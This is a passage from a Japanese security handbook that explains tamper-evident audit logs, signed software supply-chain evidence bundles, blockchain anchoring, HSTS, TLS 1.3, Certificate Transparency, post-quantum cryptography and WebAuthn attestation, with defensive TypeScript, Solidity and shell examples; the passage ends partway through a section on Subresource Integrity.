「**過去の監査ログが書き換えられていないこと**」を証明するパターン:

```typescript
// 1日分のログを Merkle Tree で集約し、ルートを別の信頼できる場所に保存
async function dailyAuditDigest(date: Date): Promise<void> {
  const logs = await db.auditLog.findMany({
    where: {
      createdAt: { gte: startOfDay(date), lt: endOfDay(date) },
    },
    orderBy: { createdAt: 'asc' },
  });

  const leaves = logs.map((log) =>
    Buffer.from(JSON.stringify({
      id: log.id,
      timestamp: log.createdAt.toISOString(),
      actor: log.actor,
      action: log.action,
      resource: log.resource,
    })),
  );

  const tree = new MerkleTree(leaves);
  const root = tree.getRoot();

  // ルートを「動かない場所」に保存(複数の場所に冗長化)
  await db.dailyDigest.create({
    data: {
      date,
      root: root.toString('hex'),
      logCount: logs.length,
    },
  });

  // さらに外部の不変ストレージへ
  await s3.putObject({
    Bucket: 'audit-digests-immutable',
    Key: `digest-${date.toISOString().slice(0, 10)}.txt`,
    Body: root,
    // ObjectLock で書き換え不可に
    ObjectLockMode: 'COMPLIANCE',
    ObjectLockRetainUntilDate: addYears(date, 7),
  });
}
```

後から「2026年5月20日のログXは改ざんされていないか?」を検証するときは:
1. その日の Merkle Root を取得
2. ログXのプルーフを生成
3. `verifyProof` で確認

これで「ログテーブルへの後付け書き換え」を検出できる。SOX法対応、GDPR、医療記録、金融トランザクションなど、**改ざん不可性の証明が法的に要求される領域**で重宝される。

<a id="section-23-15"></a>
### 23.15 Evidence Bundle ― ソフトウェアサプライチェーンの完全性
<!-- handbook:learning {"level":"advanced","minutes":35} -->
<!-- handbook:index {"group":"C","term":"cosign"} -->
<!-- handbook:index {"group":"E","term":"Evidence Bundle"} -->
<!-- handbook:index {"group":"M","term":"Manifest (Evidence Bundle)"} -->
<!-- handbook:index {"group":"P","term":"Provenance"} -->
<!-- handbook:index {"group":"S","term":"Sigstore"} -->
<!-- handbook:index {"group":"S","term":"SLSA"} -->

<!-- handbook:narrative-bridge {"section":"23.15"} -->
Merkle Proofはデータ集合の改変を検出できるが、そのデータがどのソース、ビルド、依存から作られたかまでは説明しない。Evidence Bundleは、成果物と生成過程の証拠を一緒に検証可能にする。

ソフトウェアサプライチェーン攻撃 (SolarWinds、Codecov、xz-utils 等の事件) を受けて、業界では「**ビルド成果物が、改ざんなく、本物のソースから生成された**ことを証明する」標準が整備された。中心となるのが **SLSA** [SLSA, 2023] (Supply-chain Levels for Software Artifacts) と **Sigstore** [Newman et al., 2022] だ。

#### Evidence Bundle とは

Evidence Bundle (証拠バンドル) は、ソフトウェア成果物 (コンテナイメージ、ビルド産物、SBOM) に紐付く以下を1つにまとめたもの:

- **artifact**: 配布される成果物そのもの、またはそのハッシュ
- **manifest**: 含まれるファイルとそのハッシュのリスト
- **provenance**: ビルド由来情報 (ソースコード commit、ビルダ、依存関係)
- **signature**: 上記すべてに対する電子署名
- **certificate**: 署名鍵の正当性を保証する証明書

仕様: in-toto Attestation、SLSA Provenance v1、Sigstore Bundle。

#### Manifest 検証の実装

```typescript
import { createHash } from 'node:crypto';
import { readFile } from 'node:fs/promises';
import path from 'node:path';

interface FileEntry {
  path: string;
  sha256: string;
  size: number;
}

interface Manifest {
  version: '1.0';
  createdAt: string;
  files: FileEntry[];
  rootHash: string;  // 全エントリを連結してハッシュ化
}

/** Manifest を生成 (ビルド時) */
async function generateManifest(baseDir: string, filePaths: string[]): Promise<Manifest> {
  const files: FileEntry[] = [];
  for (const rel of filePaths.sort()) {  // 順序を固定
    const abs = path.join(baseDir, rel);
    const content = await readFile(abs);
    files.push({
      path: rel,
      sha256: createHash('sha256').update(content).digest('hex'),
      size: content.length,
    });
  }

  // Root ハッシュ: 全エントリの正規化文字列を結合してハッシュ
  const concat = files.map((f) => `${f.path}\t${f.sha256}\t${f.size}`).join('\n');
  const rootHash = createHash('sha256').update(concat).digest('hex');

  return {
    version: '1.0',
    createdAt: new Date().toISOString(),
    files,
    rootHash,
  };
}

/** Manifest の整合性を検証 */
async function verifyManifest(baseDir: string, manifest: Manifest): Promise<{
  ok: boolean;
  errors: string[];
}> {
  const errors: string[] = [];

  // 1. Root ハッシュの一致を確認(manifest 自体の改ざんを検知)
  const concat = manifest.files
    .map((f) => `${f.path}\t${f.sha256}\t${f.size}`)
    .join('\n');
  const recomputedRoot = createHash('sha256').update(concat).digest('hex');
  if (recomputedRoot !== manifest.rootHash) {
    errors.push(`Root hash mismatch: expected ${manifest.rootHash}, got ${recomputedRoot}`);
    return { ok: false, errors };
  }

  // 2. 各ファイルのハッシュを再計算
  for (const entry of manifest.files) {
    const abs = path.join(baseDir, entry.path);
    let content: Buffer;
    try {
      content = await readFile(abs);
    } catch {
      errors.push(`Missing file: ${entry.path}`);
      continue;
    }
    if (content.length !== entry.size) {
      errors.push(`Size mismatch ${entry.path}: expected ${entry.size}, got ${content.length}`);
    }
    const actualHash = createHash('sha256').update(content).digest('hex');
    if (actualHash !== entry.sha256) {
      errors.push(`Hash mismatch ${entry.path}: expected ${entry.sha256}, got ${actualHash}`);
    }
  }

  return { ok: errors.length === 0, errors };
}
```

#### 署名つき Evidence Bundle の検証

manifest だけでは「manifest 自身が改ざんされた」可能性を排除できない。そこで manifest 全体を Ed25519 で署名し、署名 + 公開鍵証明書をバンドルに含める。

```typescript
import { sign, verify, createPublicKey, createPrivateKey } from 'node:crypto';

interface EvidenceBundle {
  manifest: Manifest;
  provenance: {
    sourceRepo: string;
    sourceCommit: string;
    buildTimestamp: string;
    builderId: string;        // 例: 'github-actions://github/owner/repo/.github/workflows/build.yml@refs/heads/main'
    materials: { uri: string; digest: { sha256: string } }[];  // 依存
  };
  signature: {
    algorithm: 'ed25519';
    publicKeyId: string;       // KMS の鍵ID または fingerprint
    value: string;             // base64url
  };
}

/** 署名対象を決定的にシリアライズ(JSON canonical form) */
function canonicalize(obj: unknown): string {
  // 単純実装: ソート済みキーで JSON.stringify
  if (Array.isArray(obj)) {
    return '[' + obj.map(canonicalize).join(',') + ']';
  }
  if (obj && typeof obj === 'object') {
    const entries = Object.entries(obj as Record<string, unknown>).sort(([a], [b]) =>
      a.localeCompare(b),
    );
    return '{' + entries.map(([k, v]) => `${JSON.stringify(k)}:${canonicalize(v)}`).join(',') + '}';
  }
  return JSON.stringify(obj);
}

/** バンドル生成(ビルド側) */
function createBundle(
  manifest: Manifest,
  provenance: EvidenceBundle['provenance'],
  privateKeyPem: string,
  publicKeyId: string,
): EvidenceBundle {
  const toSign = canonicalize({ manifest, provenance });
  const privateKey = createPrivateKey({ key: privateKeyPem, format: 'pem' });
  const sig = sign(null, Buffer.from(toSign, 'utf8'), privateKey);
  return {
    manifest,
    provenance,
    signature: {
      algorithm: 'ed25519',
      publicKeyId,
      value: sig.toString('base64url'),
    },
  };
}

/** バンドル検証(配布側) */
async function verifyBundle(
  bundle: EvidenceBundle,
  baseDir: string,
  trustedPublicKeys: Map<string, string>,  // keyId → PEM
): Promise<{ ok: boolean; errors: string[] }> {
  const errors: string[] = [];

  // 1. 公開鍵が信頼済みか
  const publicKeyPem = trustedPublicKeys.get(bundle.signature.publicKeyId);
  if (!publicKeyPem) {
    return { ok: false, errors: [`Untrusted key: ${bundle.signature.publicKeyId}`] };
  }

  // 2. 署名検証(manifest + provenance に対して)
  const toVerify = canonicalize({
    manifest: bundle.manifest,
    provenance: bundle.provenance,
  });
  const publicKey = createPublicKey({ key: publicKeyPem, format: 'pem' });
  const sigBuf = Buffer.from(bundle.signature.value, 'base64url');
  const sigValid = verify(null, Buffer.from(toVerify, 'utf8'), publicKey, sigBuf);
  if (!sigValid) {
    return { ok: false, errors: ['Invalid signature'] };
  }

  // 3. Manifest を信用したうえで、実ファイルとの一致確認
  const manifestCheck = await verifyManifest(baseDir, bundle.manifest);
  if (!manifestCheck.ok) {
    errors.push(...manifestCheck.errors);
  }

  // 4. (本格運用では) ビルダーID が許可リストにあるか確認
  const ALLOWED_BUILDERS = [
    /^github-actions:\/\/github\/myorg\//,
  ];
  if (!ALLOWED_BUILDERS.some((p) => p.test(bundle.provenance.builderId))) {
    errors.push(`Untrusted builder: ${bundle.provenance.builderId}`);
  }

  return { ok: errors.length === 0, errors };
}

// === 使用例: デプロイ前にバンドル検証 ===
const bundle: EvidenceBundle = JSON.parse(await readFile('bundle.json', 'utf8'));
const trustedKeys = new Map([
  ['my-org-signing-key-v1', await readFile('keys/v1.pub', 'utf8')],
]);
const result = await verifyBundle(bundle, './extracted', trustedKeys);
if (!result.ok) {
  console.error('Bundle verification failed:', result.errors);
  process.exit(1);
}
console.log('Bundle verified, safe to deploy');
```

#### Sigstore / cosign との関係

実プロジェクトで自前実装する必要はあまりない。**Sigstore** はLinux Foundation のプロジェクトで、上の仕組みを「**ID プロバイダ (Google/GitHub) で発行した一時的な鍵で署名し、公開ログ (Rekor) に記録する**」形で運用する標準になっている。

```bash
# コンテナイメージ署名
cosign sign --keyless ghcr.io/myorg/myapp:v1.2.3

# 検証
cosign verify --certificate-identity=https://github.com/myorg/myapp/.github/workflows/release.yml@refs/tags/v1.2.3 \
              --certificate-oidc-issuer=https://token.actions.githubusercontent.com \
              ghcr.io/myorg/myapp:v1.2.3
```

Kubernetes admission controller (`policy-controller`、`Kyverno`) と組み合わせれば「**署名なしのイメージは本番にデプロイできない**」というポリシーを強制できる。

<a id="section-23-16"></a>
### 23.16 ブロックチェーンアンカー ― 改ざん不可性の極限
<!-- handbook:learning {"level":"outlook","minutes":25} -->
<!-- handbook:index {"group":"O","term":"OpenTimestamps"} -->

<!-- handbook:narrative-bridge {"section":"23.16"} -->
組織内でEvidence Bundleを保存しても、管理者が証拠と履歴を同時に書き換えられる余地は残る。外部台帳へのアンカーは、ある時点に特定のハッシュが存在したことを第三者にも検証可能にする。

「**監査ログをいくら署名・Merkle化しても、それを保管している組織自体が後から書き換えたら?**」 ― この最終的な信頼問題に答える手段がブロックチェーンアンカーだ。

#### ブロックチェーンアンカーの仕組み

定期的に、自社の Merkle Root を**公開ブロックチェーン**(Bitcoin [Nakamoto, 2008]、Ethereum [Wood, 2014]) のトランザクションとして書き込む。一度書かれた値を後から変えるには、その後に積み上がったブロックをすべて作り直す必要があり、実務上は不可能な費用になる。

```text
[組織の監査ログ] → [日次 Merkle Root] → [Bitcoin Tx: OP_RETURN <root>]
                                            ↓
                                      [Blockhash で時刻を固定]
                                            ↓
                                      [永久に検証可能]
```

これで「2026年5月20日時点で、組織は確かにこの Merkle Root を保持していた」が**第三者検証可能**になる。後から組織がログを偽造しても、当時のチェーン上の root と一致しないので必ずバレる。

実装パターンは2種類:

1. **直接書き込み**: 自分でトランザクションを作成して送信 (手数料が継続コスト)
2. **タイムスタンプサービス利用**: OpenTimestamps が代表。複数のリクエストをまとめて1トランザクションに集約することで手数料を分散化 (無料で使える)

#### OpenTimestamps を使った実装

```typescript
// 1. ローカルでハッシュを準備
const merkleRoot = computeDailyMerkleRoot(logs);  // 例: '8a3f...'

// 2. OpenTimestamps クライアントで .ots ファイルを作成
//    (内部的に複数の caller のハッシュを Merkle Tree に集約し、
//     その上位 root だけを Bitcoin に書き込む)
import OpenTimestamps from 'javascript-opentimestamps';

const detached = OpenTimestamps.DetachedTimestampFile.fromHash(
  new OpenTimestamps.Ops.OpSHA256(),
  Buffer.from(merkleRoot, 'hex'),
);

await OpenTimestamps.stamp(detached);

// .ots ファイルとして保存
const otsBytes = detached.serializeToBytes();
await writeFile(`digest-${date}.ots`, otsBytes);

// この時点ではまだ Bitcoin に未確定。数時間後に確定する
```

```typescript
// 3. 後日(数時間後)アップグレードして Bitcoin block への参照を取り込む
const otsBytes = await readFile(`digest-${date}.ots`);
const detached = OpenTimestamps.DetachedTimestampFile.deserialize(otsBytes);
await OpenTimestamps.upgrade(detached);
await writeFile(`digest-${date}.ots`, detached.serializeToBytes());

// 4. 検証
const verifyResult = await OpenTimestamps.verify(detached);
console.log(verifyResult);
// {
//   bitcoin: { timestamp: 1716212345, height: 845123 },
// }
// → Bitcoin ブロック高 845123 の時点で、このハッシュが存在したことが証明される
```

#### Ethereum スマートコントラクトを使う場合

より柔軟な構造を持たせたいなら、Ethereum に直接コントラクトを置く方法もある:

```solidity
// contracts/AuditAnchor.sol
pragma solidity ^0.8.20;

contract AuditAnchor {
    struct Anchor {
        bytes32 merkleRoot;
        uint64 timestamp;
        uint32 logCount;
    }

    // organizationId => date => Anchor
    mapping(bytes32 => mapping(uint32 => Anchor)) public anchors;

    event Anchored(bytes32 indexed orgId, uint32 indexed date, bytes32 root, uint32 logCount);

    function anchor(
        bytes32 orgId,
        uint32 date,        // YYYYMMDD
        bytes32 root,
        uint32 logCount
    ) external {
        require(anchors[orgId][date].timestamp == 0, "Already anchored");
        anchors[orgId][date] = Anchor(root, uint64(block.timestamp), logCount);
        emit Anchored(orgId, date, root, logCount);
    }
}
```

> **試すときの注意**: 以下のコードは本番チェーン (mainnet) へ書き込む。書き込みには実費 (ガス代) がかかり、送ったトランザクションは取り消せない。手元で試すときは必ずテストネットか、Anvil などのローカルチェーンへ向ける。また、秘密鍵を環境変数へ平文で置く形は学習用の簡略化である。鍵はKMSやハードウェアウォレット、あるいは署名専用のサービスへ預け、アプリのプロセスから直接読めない場所に置く。鍵が1度漏れれば、その鍵が持つ資産と権限はすべて失われる。

```typescript
// クライアント (viem)
import { createWalletClient, createPublicClient, http, parseEther } from 'viem';
import { mainnet, sepolia } from 'viem/chains';
import { privateKeyToAccount } from 'viem/accounts';

// 既定はテストネット。mainnet へ向けるのは、上の注意を理解したうえで明示したときだけ
const chain = process.env.ANCHOR_CHAIN === 'mainnet' ? mainnet : sepolia;
const account = privateKeyToAccount(process.env.ANCHOR_PRIVATE_KEY! as `0x${string}`);
const wallet = createWalletClient({ account, chain, transport: http() });
const pub = createPublicClient({ chain, transport: http() });

async function anchorToEthereum(orgId: string, date: number, root: string, count: number) {
  const txHash = await wallet.writeContract({
    address: CONTRACT_ADDRESS,
    abi: AUDIT_ANCHOR_ABI,
    functionName: 'anchor',
    args: [
      `0x${orgId.padStart(64, '0')}`,
      date,
      `0x${root}`,
      count,
    ],
  });
  // 確定を待つ
  const receipt = await pub.waitForTransactionReceipt({ hash: txHash });
  return { txHash, blockNumber: receipt.blockNumber };
}

// 検証(誰でも実行可能、組織を信用する必要なし)
async function verifyAnchor(orgId: string, date: number): Promise<string> {
  const result = await pub.readContract({
    address: CONTRACT_ADDRESS,
    abi: AUDIT_ANCHOR_ABI,
    functionName: 'anchors',
    args: [`0x${orgId.padStart(64, '0')}`, date],
  });
  return (result as { merkleRoot: string }).merkleRoot;
}
```

#### 採用判断

ブロックチェーンアンカーは**コストとオーバーヘッドが大きい**ため、必要性を冷静に判断する。

| 採用検討すべきケース | 不要なケース |
|---|---|
| 規制要件で第三者検証が必須 (金融、医療) | 内部監査用途のみ |
| 紛争時に裁判所等で証拠提出する可能性がある | 通常の事業ログ |
| 改ざんの動機が組織内部にもある | 信頼できる外部監査機関がある |
| 数十年スパンで保存する必要がある | 保存期間が数年程度 |

「**社内の Merkle Tree + S3 ObjectLock**」だけでも十分実用的なケースは多い。ブロックチェーンに行くのは「**それでは法的/業界的に不十分**」と判断したときだけだ。多くの場合、組織内で改ざん不可性を担保すれば足りる。

<a id="section-23-17"></a>
### 23.17 HSTS の詳細 ― HTTPS 強制の正しい使い方
<!-- handbook:learning {"level":"practical","minutes":10} -->
<!-- handbook:index {"group":"H","term":"HSTS"} -->
<!-- handbook:index {"group":"H","term":"HSTS Preload"} -->

<!-- handbook:narrative-bridge {"section":"23.17"} -->
保存データの完全性を証明しても、利用者が最初に安全でないHTTPへ誘導されれば、通信開始時点で改ざんされうる。HSTSは、ブラウザにHTTPSのみを使う方針を記憶させ、ダウングレード経路を閉じる。

23.11 でセキュアヘッダの一覧に挙げた **HSTS (HTTP Strict Transport Security)** [RFC 6797] は重要なので深掘りする。

#### HSTS が解決する問題

ユーザーが `example.com` と URL バーに入力すると、ブラウザはまず `http://example.com` にアクセス → サーバが `https://example.com` にリダイレクト → 安全な接続が確立。

**この最初の HTTP リクエストが盗聴できる**。中間者攻撃 (MITM) で、攻撃者が `http://` をハイジャックし、ニセサイトに誘導したり、HTTPSリダイレクトを除去して通信を読んだりできる。これは **SSL Stripping** 攻撃と呼ばれる。

HSTS は「**このサイトに今後一切 HTTP では接続するな**」をブラウザに記憶させる仕組み。

#### 設定

```text
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

- `max-age=31536000`: 1年間 HTTPS のみ
- `includeSubDomains`: サブドメインも対象
- `preload`: ブラウザに事前登録 (後述)

#### HSTS Preload リスト

「**最初の HTTP リクエストすら防ぐ**」ためには、ブラウザに事前に「このドメインは HSTS」と教える必要がある。これが **Preload List**。

提出先: `https://hstspreload.org/`

要件:
- 有効な HTTPS 証明書
- HTTP → HTTPS リダイレクト
- HSTS ヘッダに `max-age >= 31536000`、`includeSubDomains`、`preload` を含む
- サブドメイン全てが HTTPS で動く

Preload に登録されると、Chrome、Firefox、Safari、Edge にハードコードされる。**登録は事実上の永続化**(削除には数ヶ月〜数年かかる) なので、本当に大丈夫か慎重に検討する。

#### HSTS の落とし穴

1. **Preload は撤回が困難**: 全サブドメインで永続的に HTTPS を維持する覚悟が必要
2. **証明書失効** = サイト全部アクセス不可: HTTP フォールバックすら効かない
3. **開発環境**: localhost も HSTS の対象にならないよう注意
4. **サブドメインの管理**: `includeSubDomains` を指定するなら、新規サブドメイン作成時もHTTPS必須
5. **メール HTTPS リンクの遮断**: 古いメール内の `http://` リンクも HTTPS に強制される (これは利点でもある)

#### 段階的導入

いきなり Preload は危険。段階を踏む:

```text
Phase 1: max-age=300 (5分)        ← 問題があればすぐ撤回可
Phase 2: max-age=86400 (1日)
Phase 3: max-age=2592000 (1ヶ月)
Phase 4: max-age=31536000 + includeSubDomains
Phase 5: + preload → HSTS Preload リストに申請
```

各段階で監視し、問題なければ次へ。

<a id="section-23-18"></a>
### 23.18 ChaCha20-Poly1305 ― AES に並ぶモバイル向け暗号
<!-- handbook:learning {"level":"advanced","minutes":5} -->
<!-- handbook:index {"group":"C","term":"ChaCha20-Poly1305"} -->

<!-- handbook:narrative-bridge {"section":"23.18"} -->
HTTPSを強制した後は、その通信路でどの暗号方式を使うかが問題になる。ChaCha20-Poly1305は、AES専用命令を持たない環境でも認証付き暗号を効率良く提供する選択肢である。

TLS 1.3 で標準採用されている暗号スイートのうち、**ChaCha20-Poly1305** は AES-GCM と並ぶ重要な対称暗号 [RFC 8439]。

#### AES-GCM との比較

| | AES-GCM | ChaCha20-Poly1305 |
|---|---|---|
| 設計者 | NIST 標準化 | Daniel J. Bernstein (Ed25519と同じ) |
| ハードウェア支援 | AES-NI (Intel/AMD CPU 内蔵) | なし (ソフト実装) |
| ハードなしの速度 | 遅い | 速い |
| ハードありの速度 | 高速 | 同等 |
| サイドチャネル耐性 | 実装依存 | 設計レベルで高い |

**結論:**

- **デスクトップ・サーバ**: AES-NI があるので AES-GCM が高速
- **モバイル・低電力デバイス**: AES-NI なしの環境では ChaCha20 が速い
- **TLS 1.3**: クライアントの能力に応じてサーバが選択 (Cipher Suite negotiation)

Google が Android で ChaCha20 を採用したのが普及の発端。現代の TLS 設定では両方有効にしておくのが標準。

<a id="section-23-19"></a>
### 23.19 TLS 1.3 ハンドシェイクの詳細
<!-- handbook:learning {"level":"practical","minutes":10} -->
<!-- handbook:index {"group":"T","term":"TLS 1.3"} -->

<!-- handbook:narrative-bridge {"section":"23.19"} -->
暗号アルゴリズムを選んでも、鍵共有と証明書検証の往復が古いままでは、遅延と攻撃面が残る。TLS 1.3はハンドシェイクを再設計し、安全なデフォルト値と少ない往復を両立させる。

3.3 で TLS を扱った際、詳細は省いた。ここで TLS 1.3 のハンドシェイクを深掘りする [RFC 8446]。

#### TLS 1.2 までの問題

TLS 1.2 のハンドシェイク = **2 RTT**(往復2回)。

```text
Client → Server: ClientHello (暗号スイート提案)
Server → Client: ServerHello + 証明書 + 鍵交換情報
Client → Server: 鍵交換完了 + Finished
Server → Client: Finished
(ようやくデータ送信開始)
```

接続が確立するまで2往復、つまり遅い回線では数百ms かかる。

#### TLS 1.3 の 1-RTT

TLS 1.3 はこれを **1 RTT** に短縮した。

```text
Client → Server: ClientHello + Key Share (推測した鍵交換情報も同時送信)
Server → Client: ServerHello + 証明書 + Finished + 暗号化された応答データ
(もう接続確立! クライアントも応答を送信可)
```

クライアントは最初の ClientHello に「**最もよく使われる暗号スイートでの鍵交換情報**」を**推測で含めて**送る。サーバが同意すればそのまま使え、合わない場合だけ1往復追加 (2-RTT のフォールバック)。

#### TLS 1.3 の主な変更点

1. **暗号スイート整理**: 安全でないものを削除
   - RC4、3DES、MD5、SHA-1、CBC モード ― すべて削除
   - 残るのは AES-GCM、ChaCha20-Poly1305、AES-CCM のみ
2. **Perfect Forward Secrecy 必須**: 鍵交換は常に Ephemeral (DH/ECDH)
3. **証明書の暗号化**: ServerHello 後の証明書も暗号化される (中間者が誰のサイトかわかりにくい)
4. **Session Tickets**: セッション再開の標準化、改ざん耐性向上

#### 0-RTT ― 究極の高速化 (と罠)

**0-RTT (Zero Round-Trip Resumption)**: 再接続時に「**最初のリクエスト自体に**」アプリデータを乗せる。

```text
2回目以降の接続:
Client → Server: ClientHello + 暗号化されたGETリクエスト (もうデータ!)
Server → Client: ServerHello + レスポンス
```

**速度のメリット**は大きい (モバイルで体感できるレベル) が、**リプレイ攻撃に弱い**:

```text
攻撃者が 0-RTT データを傍受
→ サーバに同じデータを再送
→ サーバが「もう一度」処理してしまう
```

このため:

- **GET など冪等な操作のみ** 0-RTT 許可
- **POST、決済、認証関連の操作は 0-RTT 禁止**
- CDN や WAF レベルで判断

Cloudflare 等は「GET のみ 0-RTT」をデフォルトで実装している。

#### 検証してみる

```bash
# OpenSSL で TLS 1.3 接続を確認
openssl s_client -connect example.com:443 -tls1_3

# 出力に「Protocol: TLSv1.3」と「Cipher: TLS_AES_256_GCM_SHA384」等が表示される
```

<a id="section-23-20"></a>
### 23.20 Certificate Transparency (CT)
<!-- handbook:learning {"level":"practical","minutes":10} -->
<!-- handbook:index {"group":"C","term":"Certificate Transparency (CT)"} -->

<!-- handbook:narrative-bridge {"section":"23.20"} -->
TLS 1.3が証明書を検証しても、不正または誤発行された証明書を利用者が個別に発見するのは難しい。Certificate Transparencyは、発行事実を公開ログへ記録し、ドメイン所有者による監視を可能にする。

「**CA が誤った証明書を発行したらどうやって気づくか?**」を解決するのが **Certificate Transparency** [RFC 6962]。

#### Certificate Transparency の仕組み

全 CA は発行した証明書を**公開ログ**(Append-only Merkle Tree、23.14 と同じ構造) に登録する。

```text
CA → 証明書発行 → CT Log に登録 (SCT = Signed Certificate Timestamp 取得)
↓
SCT を証明書 / OCSP / TLS 拡張のいずれかでクライアントに送信
↓
ブラウザは SCT が正規 CT Log で署名されていることを検証
↓
SCT がない/不正な証明書は拒否
```

**主な CT Log:**

- Google Argon (各年で別ログ: argon2024、argon2025)
- Let's Encrypt Oak
- Cloudflare Nimbus
- Sectigo Sabre

#### crt.sh で誰でも検索可能

```text
https://crt.sh/?q=%25.example.com
```

このサイトで自分のドメインの証明書履歴が見える。**競合や知らない人が証明書を取得していたら異常**。定期的にチェックすべき。

#### 自社で監視するには

```typescript
// crt.sh API で定期チェック
async function monitorCertificates(domain: string) {
  const res = await fetch(`https://crt.sh/?q=%.${domain}&output=json`);
  const certs = await res.json();

  const recentCerts = certs.filter(
    (c: any) => new Date(c.entry_timestamp) > subDays(new Date(), 1)
  );

  for (const cert of recentCerts) {
    if (!isExpectedIssuer(cert.issuer_name)) {
      await alertSecurityTeam(`Unexpected cert: ${cert.common_name} from ${cert.issuer_name}`);
    }
  }
}
```

これで「**自社ドメインで知らない CA が証明書を発行した**」を24時間以内に検知できる。

<a id="section-23-21"></a>
### 23.21 Post-Quantum Cryptography ― 量子コンピュータ時代の備え
<!-- handbook:learning {"level":"outlook","minutes":10} -->
<!-- handbook:index {"group":"M","term":"ML-DSA (FIPS 204)"} -->
<!-- handbook:index {"group":"M","term":"ML-KEM (FIPS 203)"} -->
<!-- handbook:index {"group":"P","term":"Post-Quantum Cryptography (PQC)"} -->
<!-- handbook:index {"group":"S","term":"SLH-DSA (FIPS 205)"} -->
<!-- handbook:index {"group":"Z","term":"Zero Trust"} -->
<!-- handbook:index {"group":"た行","term":"耐量子暗号 (PQC)"} -->
<!-- handbook:index {"group":"ら行","term":"量子耐性暗号"} -->

<!-- handbook:narrative-bridge {"section":"23.21"} -->
現在の証明書と暗号を監視しても、長期保存される暗号文は将来の計算能力向上にさらされる。Post-Quantum Cryptographyは、移行期間とデータ寿命を含めて今から備える必要がある問題を扱う。

将来的に量子コンピュータが実用化されると、現在の公開鍵暗号 (RSA、ECDSA、ECDH) が突破される可能性がある。これに備えた**耐量子暗号 (PQC: Post-Quantum Cryptography)** が NIST で標準化された [NIST PQC, 2024]。

#### 主要な標準化アルゴリズム (2024年8月公式化)

| アルゴリズム | 用途 | 旧名 |
|---|---|---|
| **ML-KEM (FIPS 203)** | 鍵カプセル化 (鍵交換) | CRYSTALS-Kyber |
| **ML-DSA (FIPS 204)** | デジタル署名 | CRYSTALS-Dilithium |
| **SLH-DSA (FIPS 205)** | デジタル署名 (ハッシュベース) | SPHINCS+ |

#### 「Harvest Now, Decrypt Later」 攻撃

「**今のうちに暗号化通信を保存しておき、将来量子コンピュータで復号する**」攻撃は既に始まっていると考えられている。長期間秘密にしたい情報 (医療記録、政府機密、企業秘密) は**今から PQC への移行を検討**すべき。

#### 現在の状況 (2026年)

- **Chrome (Google)**: 2024年から ML-KEM のハイブリッド版を TLS で実装開始
- **Cloudflare**: PQC ハイブリッドを既に本番運用
- **Signal**: PQXDH (Post-Quantum Extended Diffie-Hellman) を 2023 年に公表・導入
- **AWS、Microsoft、Google**: 内部 API で段階的に PQC 採用

**「ハイブリッド方式」**(従来暗号 + PQC を組み合わせる) が現実的な移行戦略。万一 PQC に脆弱性が見つかっても、従来暗号で保護される。

#### 開発者の対応

- 短期: 何もしなくてよい (主要ライブラリ・ブラウザが対応中)
- 中期: 自社で長期保存する情報の暗号化を再検討 (PQC への移行計画)
- 長期: 全てのプロトコルが PQC ハイブリッドに移行

<a id="section-23-22"></a>
### 23.22 WebAuthn Attestation ― 「本当に正規の認証器か」を検証
<!-- handbook:learning {"level":"advanced","minutes":15} -->
<!-- handbook:index {"group":"A","term":"Attestation (WebAuthn)"} -->
<!-- handbook:index {"group":"P","term":"Platform Authenticator"} -->
<!-- handbook:index {"group":"W","term":"WebAuthn Attestation"} -->

<!-- handbook:narrative-bridge {"section":"23.22"} -->
暗号方式を将来へ移行しても、利用者が登録した認証器の種類や信頼性が不明なら、高保証な本人確認には不足する。WebAuthn Attestationは、認証器そのものの由来を検証するための追加情報を扱う。

13.9 でパスキー (WebAuthn) を扱った。本節では深掘りされなかった **Attestation** を扱う。

#### Attestation とは

WebAuthn 認証器が登録される際、「**この認証器は本当に正規の YubiKey か / Apple の Touch ID か**」を検証できる仕組み。製造元が認証器に埋め込んだ証明書で署名する。

```text
Authenticator (YubiKey、Touch ID等)
   └── Attestation Certificate (Yubico、Apple が発行)
   └── 認証中に "私は本物の YubiKey です" の署名を提供
```

#### Attestation Format

WebAuthn は複数の Attestation 形式を定義:

- **none**: Attestation なし (プライバシー優先、ほとんどの一般用途)
- **packed**: 一般的な形式
- **fido-u2f**: 古い U2F 互換
- **tpm**: TPM (Windows Hello 等)
- **android-key**: Android のキーストア
- **apple**: Apple の Touch ID/Face ID

#### Attestation を要求すべきケース

ほとんどの一般 Web アプリでは `attestation: 'none'` で十分。Attestation を要求するのは:

- **企業の管理対象認証器のみ許可**: 「会社支給の YubiKey 以外は登録不可」
- **規制要件で認証器の保証レベルが必要**: 金融、政府
- **特定の Authenticator Class のみ許可**: Roaming Authenticator(物理キー) のみ等

```typescript
// Attestation 要求と検証
const options = await generateRegistrationOptions({
  rpName: 'My Bank',
  rpID: 'mybank.com',
  userID,
  userName: user.email,
  attestationType: 'direct',  // Attestation を要求
  // 信頼する Authenticator のみ許可
  authenticatorSelection: {
    authenticatorAttachment: 'cross-platform',  // 物理キーのみ
    userVerification: 'required',
    residentKey: 'required',
  },
});

// 検証時
const verification = await verifyRegistrationResponse({
  response,
  expectedChallenge,
  expectedOrigin: 'https://mybank.com',
  expectedRPID: 'mybank.com',
  requireUserVerification: true,
});

// Attestation の Trust Path を検証
// FIDO Alliance が提供する Metadata Service (MDS) で
// 認証器の AAGUID (16バイトID) を照合
if (!await isAllowedAuthenticator(verification.registrationInfo.aaguid)) {
  throw new Error('Authenticator not allowed by policy');
}
```

#### プラットフォーム認証器 vs ローミング認証器

- **Platform Authenticator**: デバイス内蔵 (Touch ID、Windows Hello、Android Strongbox)― そのデバイスでしか使えないがUX良い
- **Cross-Platform / Roaming Authenticator**: 物理キー (YubiKey、Solo Key)― 複数デバイスで使い回せる、紛失リスク

WebAuthn の `authenticatorAttachment` で要求できる。

<a id="section-23-23"></a>
### 23.23 Subresource Integrity (SRI)
<!-- handbook:learning {"level":"practical","minutes":5} -->
<!-- handbook:index {"group":"S","term":"SRI (Subresource Integrity)"} -->

<!-- handbook:narrative-bridge {"section":"23.23"} -->
認証器を信頼できても、ページが読み込む外部スクリプトが差し替えられれば、利用者の権限はそのコードに奪われる。SRIは、取得したサブリソースの内容を期待したハッシュと照合する。

CDN から JavaScript を読み込むのは便利だが、**CDN 自体が侵害されたら?** 全ユーザーに悪意あるコードが配信される。

**SRI (Subresource Integrity)** はこれを防ぐ [W3C SRI, 2016]。

```html
<script
  src="https://cdn.example.com/jquery-3.7.0.min.js"
  integrity="sha384-N7VfRf+E6E+CtKpsohqWyJYx5XSp7vRRCnLZbpd0a1qHsZL+5R2H5C4Vqw7TpC9N"
